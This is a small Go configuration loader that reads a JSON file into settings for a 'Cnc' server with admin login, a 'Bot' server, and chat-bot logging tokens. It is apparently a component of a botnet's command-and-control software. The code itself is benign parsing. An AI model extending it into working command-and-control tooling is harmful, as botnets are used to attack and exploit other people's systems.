package config

import (
	"encoding/json"
	"os"

	"github.com/fatih/color"
)

type Config struct {
	Cnc struct {
		Server   string
		AdmLogin string
		Port     string
	}
	Bot struct {
		Server string
		Port   string
	}
	Logging struct {
		BotToken string
		ChatId   string
		Logging  bool
	}
}

func GetConfig() *Config {

	var config Config

	file, err := os.ReadFile("./config.json")
	if err != nil {
		color.HiRed("Can't read config")
		return nil
	}

	json.Unmarshal(file, &config)

	return &config

}
